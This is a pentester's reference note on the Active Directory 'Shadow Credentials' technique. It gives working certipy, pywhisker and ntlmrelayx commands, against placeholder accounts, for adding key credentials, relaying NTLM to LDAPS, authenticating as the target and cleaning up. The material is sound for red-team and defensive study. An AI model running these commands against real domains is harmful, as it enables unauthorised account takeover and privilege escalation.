---
title: Shadow Credentials
---

> It is possible to add *Key Credentials* to the `msDS-KeyCredentialLink` attribute of the target user or computer object and then perform Kerberos authentication as that account using PKINIT.
> [source](http://web.archive.org/web/20221209164503/https://scribe.rip/@specterops/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

Shadow Credentials require Windows Server 2016 domain functional level or higher.

[[notes/ad/dacl-abuse|Abuse]] `GenericWrite` on a user object (`jdoeadm`) to add a key credential and retrieve the certificate.
Now you can authenticate as the user via [[notes/ad/kerberos-pkinit]].
If you got computer instead, you can impersonate a domain admin on that computer trough [[notes/ad/kerberos-delegate2thyself]] / [[notes/ad/kerberos-s4u2self]].

=== "[[notes/tools/certipy]]"
    Add a new key credential, authenticate via [[notes/ad/kerberos-pkinit]], [[notes/ad/unpac-the-hash]] and remove the key credential in one go.

    ~~~ bash
    certipy shadow auto -u jdoe@corp.local -p 'passw0rd' -account jdoeadm
    ~~~

=== "[[notes/tools/pywhisker]]"
    ~~~ bash
    pywhisker -v -d corp.local -u jdoe -k --no-pass -t jdoeadm --action add -P ''
    ~~~

Clean up.

=== "[[notes/tools/pywhisker]]"
    The device UUID is printed by the command above.

    ~~~ bash
    pywhisker -d corp.local -u jdoe -k --no-pass -t jdoeadm --action remove --device-id $uuid
    ~~~

=== "[[notes/tools/certipy]]"
    ~~~ bash
    certipy shadow remove -u joe@corp.local -p 'passw0rd' -account jdoeadm -device-id $uuid
    ~~~

NTLM relay [[notes/ad/ntlm-relay-to-ldap|to LDAP]] and open an interactive LDAP shell ([source](https://twitter.com/an0n_r0/status/1620906917664100353)).
When relaying a computer account the shadow target should be the SAM account name, e.g. `ws01$`.

=== "[[notes/tools/impacket]]"
    Requires [PR 1402](https://github.com/fortra/impacket/pull/1402).

    ~~~ bash
    impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --interactive --target ldaps://dc01.corp.local
    ~~~

    ~~~
    $ nc -v 127.0.0.1 11000
    # set_shadow_creds jdoeadm
    # clear_shadow_creds jdoeadm
    # exit
    ~~~

NTLM relay [[notes/ad/ntlm-relay-to-ldap|to LDAP]].
Requires manual cleanup.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --shadow-credentials --shadow-target jdoeadm --target ldaps://dc01.corp.local
    ~~~

Untested tools:

- [Whisker](https://github.com/eladshamir/whisker), written in C#

References:

- [A Hitch-hacker's Guide to DACL-Based Detections (Part 1A)](http://web.archive.org/web/20231010183106/https://trustedsec.com/blog/a-hitchhackers-guide-to-dacl-based-detections-part-1-a)
- [GOAD - part 12 - Trusts](http://web.archive.org/web/20221221202441/https://mayfly277.github.io/posts/GOADv2-pwning-part12/#foreign-group-and-users), shadow credentials across forests
- [thehacker.recipes/ad/movement/kerberos/shadow-credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
